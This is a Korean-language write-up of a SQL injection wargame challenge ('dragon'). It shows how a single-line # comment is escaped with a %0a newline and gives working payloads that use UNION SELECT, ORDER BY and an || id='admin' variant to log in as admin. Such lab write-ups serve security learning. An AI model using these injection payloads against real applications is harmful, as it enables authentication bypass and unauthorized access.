## Q20. dragon _ 주석 탈출
<img src="/photo/prob_20.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: X <br> 문제 사항: id=admin 만들기
### 해결책

```
주어진 쿼리에 # 한 줄 주석 존재
=> where id='guest' 까지 인식
=> Hello guest 출력됨
=> 주석을 탈출해야함
but. 주석 탈출 방법 몰라서 어려움을 겪음

줄을 바꾸면 주석을 탈출할 수 있을것이라고 생각함
=> %0a 사용하자 Hello guest 사라짐
=> 주석에서 탈출했음을 알게됨
```
```diff
# 현재 쿼리문: where id='guest'# and pw=' '
```
```
현재 id 컬럼이 선택되어 있음
=> union select로 admin 만들어줌
```
```diff
# where id='guest'# and pw=' union select 'admin'
```
```
but. id='guest'에 의해 guest 출력됨
=> order by로 정렬 바꾸어줌
```
```
해결 쿼리문: where id='guest'# and pw=' union select 'admin' order by id asc-- '
```
### CERT <br> ?pw=%0a union select 'admin' order by id asc--+

### 느낀점
```diff
+ 한 줄 주석(#) 탈출 방법을 알게됨
+ %0a(\n) 사용
```

### 다른 풀이
1. ?pw=%0a and pw='' || id='admin'--+
   - 주석 탈출 
   - => id='guest' 거짓으로 만듦
   - => id='admin' 만들어 문제 해결
